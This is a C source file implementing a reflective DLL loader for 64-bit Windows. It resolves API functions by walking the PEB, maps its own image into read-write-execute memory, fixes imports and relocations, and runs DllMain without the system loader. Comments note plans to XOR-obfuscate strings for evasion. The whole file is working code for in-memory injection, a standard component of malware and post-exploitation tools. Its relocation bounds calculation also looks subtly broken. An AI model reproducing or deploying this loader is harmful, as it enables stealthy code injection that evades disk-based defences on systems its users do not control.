#include "refLoader.h"
#pragma comment(lib, "user32.lib")
// #include "callFree.h"

// declspec allows to attach special properties to a declaration: calling conventions, linkage,
// alignment, importing/exporting DLL functions, thread-local storage, etc.
// ---
// inline -> replace the function call with the function actual body (no call)
// noinline -> the compiler call the function (not optimal performance wise)
//---
// noinline is mandatory, because we want the compiler to call __builtin_return_address()
// _ReturnAddress for MSVC and __builtin_return_address for MinGW
// __declspec(noinline) ULONG_PTR getCallingFunction(void) { return
// (ULONG_PTR)__builtin_return_address(0); }
__attribute__((noinline)) ULONG_PTR getCallingFunction(void) {
        return (ULONG_PTR)__builtin_return_address(0);
}

REF_LOADER BOOL WINAPI ReflectiveLoader(void) {
        // To XOR
        PEB* ProcEnvBlk = (PEB*)__readgsqword(0x60);

        PEB_LDR_DATA* ldr = ProcEnvBlk->Ldr;
        LIST_ENTRY* moduleList = &ldr->InMemoryOrderModuleList;
        LIST_ENTRY* Flk = (LIST_ENTRY*)moduleList->Flink;

        // To XOR
        const wchar_t k32[] = L"KERNEL32.DLL";
        const char func1[] = "VirtualAlloc";
        const char func2[] = "LoadLibraryA";
        const char func3[] = "GetProcAddress";
        VirtualAlloc_t virtA = NULL;
        LoadLibrary_t loadL = NULL;
        GetProcAddress_t getP = NULL;
        DllMain_t dllM = NULL;

        while ((LIST_ENTRY*)Flk != moduleList) {
                // Get the addr of the struct
                // If not, when we Flink we arrive at the "InMemoryOrderLink" addr in the struct
                // thus we can access it
                LDR_DATA_TABLE_ENTRY* ldrData = (LDR_DATA_TABLE_ENTRY*)CONTAINING_RECORD(
                    Flk, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

                // wprintf(L"FullDllName: %ls\n", ldrData->FullDllName.Buffer);
                // wprintf(L"BaseDllName: %ls\n", ldrData->BaseDllName.Buffer);
                // wprintf(L"lpProcName: %ls\n", lpModuleName);

                // Only checks the first letter of the Dll Name
                const wchar_t* buf = ldrData->BaseDllName.Buffer;

                // BaseDllName.Length returns the length of the buffer not the length of the name
                // We need to divide it by the size of one wide char to get the total number of them
                // in the buffer
                size_t nameLength = (ldrData->BaseDllName.Length) / sizeof(WCHAR);

                // Here we found Kernel32
                // We retrieve the functions we want
                if (isTargetDll(nameLength, buf, k32)) {
                        virtA = (VirtualAlloc_t)(BYTE*)getFunctionAddr(ldrData, func1);
                        loadL = (LoadLibrary_t)(BYTE*)getFunctionAddr(ldrData, func2);
                        getP = (GetProcAddress_t)(BYTE*)getFunctionAddr(ldrData, func3);
                }

                Flk = ldrData->InMemoryOrderLinks.Flink;
        }

        // We get the address of the function that called the ReflectiveLoader function
        ULONG_PTR callerAddr = (ULONG_PTR)getCallingFunction();

        // We get the baseAddr of the Reflective DLL (Searching for MZ bytes)
        BYTE* p = (BYTE*)callerAddr;
        // Ox5A4D is the magic byte of the DOS Header
        while (*(WORD*)p != 0x5A4D)
                p--;

        // This is the base address of our Reflective DLL
        ULONG_PTR baseAddr = (ULONG_PTR)p;

        IMAGE_DOS_HEADER* dosH = (IMAGE_DOS_HEADER*)baseAddr;
        IMAGE_NT_HEADERS64* ntH = (IMAGE_NT_HEADERS64*)(baseAddr + dosH->e_lfanew);
        IMAGE_OPTIONAL_HEADER64* opH = &ntH->OptionalHeader;

        void* dllBuffer;
        // If the addr in VirtualAlloc is null the memory is allocated randomly
        // Here we allocate a buffer for the Reflective DLL
        // SizeOfImage: The size of the image, in bytes, including all headers. Must be a multiple
        // of SectionAlignment.
        dllBuffer =
            virtA(NULL, (SIZE_T)opH->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        BYTE* src = (BYTE*)baseAddr;
        BYTE* dest = (BYTE*)dllBuffer;
        // The end of our buffer
        BYTE* end = dest + opH->SizeOfHeaders;
        // Basically reimplementing memcpy
        // We copy each byte from the reflective dll in our buffer
        while (dest < end) {
                *dest++ = *src++;
        }

        ULONG_PTR dllBase = (ULONG_PTR)dllBuffer;

        IMAGE_DOS_HEADER* dosHDll = (IMAGE_DOS_HEADER*)dllBase;
        IMAGE_NT_HEADERS64* ntHDll = (IMAGE_NT_HEADERS64*)(dllBase + dosHDll->e_lfanew);

        // Need to load all the sections first, we only loaded the headers
        IMAGE_SECTION_HEADER* sectionH =
            (IMAGE_SECTION_HEADER*)((BYTE*)&ntH->OptionalHeader +
                                    ntH->FileHeader.SizeOfOptionalHeader);
        for (size_t i = 0; i < ntH->FileHeader.NumberOfSections; i++) {
                // PointerToRawData points to the first bytes of the section in our reflective dll
                BYTE* srcS = (BYTE*)(DWORD*)(baseAddr + sectionH->PointerToRawData);
                // VirtualAddress is the RVA of the section, so where the section should be in
                // memory when adding the dllBase addr
                BYTE* destS = (BYTE*)(DWORD*)(dllBase + sectionH->VirtualAddress);
                // Size of the section
                BYTE* endS = destS + sectionH->SizeOfRawData;
                while (destS < endS) {
                        *destS++ = *srcS++;
                }
                sectionH++;
        }

        // We need to parse the IAT and ILT from the new allocated memory
        // Need to parse the ILT and manually fill the IAT using LoadLibrary and GetProAddress
        IMAGE_DATA_DIRECTORY* importDataDir =
            &ntHDll->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        IMAGE_IMPORT_DESCRIPTOR* importDir =
            (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)dllBase + importDataDir->VirtualAddress);
        for (IMAGE_IMPORT_DESCRIPTOR* s = importDir; s->Name != 0; ++s) {
                const char* dllName = (char*)(dllBase + (DWORD)s->Name);
                HMODULE dllHandle = loadL(dllName);
                if (dllHandle) {
                        // Get the ILT and IAT of the current struct
                        // Yes the UNION is called DUMMYUNIONNAME
                        // IMAGE_THUNK_DATA* structILT = (IMAGE_THUNK_DATA*)(baseAddr +
                        // (DWORD)s->DUMMYUNIONNAME.OriginalFirstThunk); The IAT == ILT until the
                        // loader starts to populate the IAT with the actual addresses So we can
                        // only parse the IAT to retrieve ordinals or names
                        IMAGE_THUNK_DATA* structIAT =
                            (IMAGE_THUNK_DATA*)(dllBase + (DWORD)s->FirstThunk);

                        for (IMAGE_THUNK_DATA* a = structIAT; a->u1.Function != 0; ++a) {
                                // The IMAGE_THUNK_DATA struct is a UNION of 4 arguments
                                // So to check if the most significant bit (MSB) is set we can
                                // choose any arguments
                                // All the arguments in the UNION are 64-bit Integers
                                if (a->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                                        // If the MSB is set, the last 2 bytes are the ordinal of
                                        // the function
                                        WORD ordinal = (WORD)(a->u1.Ordinal & 0xFFFF);
                                        // As it is an UNION, we can assign the function address to
                                        // any elements
                                        //(LPCSTR)(ULONG_PTR)(WORD)ordinal is the right way to cast
                                        // oridinal in the GetProcAddr function
                                        a->u1.Function = (ULONG_PTR)getP(
                                            dllHandle, (LPCSTR)(ULONG_PTR)(WORD)ordinal);
                                } else {
                                        // If the MSB isn't set, the first 2 bytes are an RVA to an
                                        // IMAGE_IMPORT_BY_NAME struct Which has two elements : Hint
                                        // and Name
                                        IMAGE_IMPORT_BY_NAME* funcStrc =
                                            (IMAGE_IMPORT_BY_NAME*)((BYTE*)dllBase +
                                                                    (DWORD)a->u1.Ordinal);
                                        a->u1.Function =
                                            (ULONG_PTR)getP(dllHandle, (LPCSTR)funcStrc->Name);
                                }
                        }
                }
        }

        // Reloc
        IMAGE_DATA_DIRECTORY* relocDataTable =
            &ntHDll->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        // We are computing the delta between the Allocated and Prefered Addr of the Dll
        ULONG_PTR pDelta = (ULONG_PTR)dllBase - (ULONG_PTR)ntHDll->OptionalHeader.ImageBase;

        // Should work with dllBase instead of baseAddr
        IMAGE_BASE_RELOCATION* relocTable =
            (IMAGE_BASE_RELOCATION*)((BYTE*)dllBase + relocDataTable->VirtualAddress);

        IMAGE_BASE_RELOCATION* relocEnd =
            (IMAGE_BASE_RELOCATION*)(relocTable + relocDataTable->Size);

        for (IMAGE_BASE_RELOCATION* pRelocBlock = relocTable;
             pRelocBlock < relocEnd && pRelocBlock->SizeOfBlock;
             pRelocBlock =
                 (IMAGE_BASE_RELOCATION*)((BYTE*)pRelocBlock + pRelocBlock->SizeOfBlock)) {
                // The IMAGE_BASE_RELOCATION struct has a 8 bytes header (which is the size of the
                // struct) Just after the last DWORD of the struct is a series if 2 bytes (WORDs)
                // entries
                //  SizeOfBlock is the total size IMAGE_BASE_RELOCATION plus all the 2 bytes entries
                unsigned int blockNbr =
                    (pRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* pEntries = (WORD*)((BYTE*)pRelocBlock + sizeof(IMAGE_BASE_RELOCATION));
                ULONG_PTR pBlockVirtualAddr =
                    (ULONG_PTR)(dllBase + (DWORD)pRelocBlock->VirtualAddress);
                for (int i = 0; i < blockNbr; ++i, ++pEntries) {
                        // We get the first 4 bits and then shift to the right 12 bits
                        // As pEntries is a ptr, we need to deref it
                        WORD type = *pEntries >> 12;
                        WORD offset = *pEntries & 0x0FFF;

                        if (type == IMAGE_REL_BASED_ABSOLUTE) {
                                continue;
                        }

                        if (type == IMAGE_REL_BASED_DIR64) {
                                // The mask 0xFFF and 0x0FFF are equivalent
                                ULONG_PTR pAddrToReloc = (ULONG_PTR)(pBlockVirtualAddr + offset);
                                // ULONG_PTR* p64 = (ULONG_PTR*)pAddrToReloc;
                                // Here we "Reloc" the value of pAddrToReloc by adding the delta
                                // We change where the ptr value is stored by adding Delta to it
                                *(ULONG_PTR*)pAddrToReloc += pDelta;
                                // *p64 += pDelta;
                                // Then we assign the new value to the pAddrToReloc value
                                // *(ULONG_PTR*)pAddrToReloc = *(ULONG_PTR*)p64;
                        }
                }

                // Because sizeof(IMAGE_BASE_RELOCATION is only the size of the header (VirtAddr and
                // SizeOfBlock)
        }

        // Call the Dll entrypoint (DllMain)
        // Get the EntryPoint RVA
        DllMain_t pEntryPoint =
            (DllMain_t)((BYTE*)dllBase + ntHDll->OptionalHeader.AddressOfEntryPoint);

        return pEntryPoint((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, NULL);
}

#ifndef CUSTOM_DLLMAIN

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {
        switch (dwReason) {
                case DLL_PROCESS_ATTACH:
                        break;

                case DLL_THREAD_ATTACH:
                        break;

                case DLL_THREAD_DETACH:
                        break;

                case DLL_PROCESS_DETACH:
                        break;
        }

        return TRUE;
}

#endif
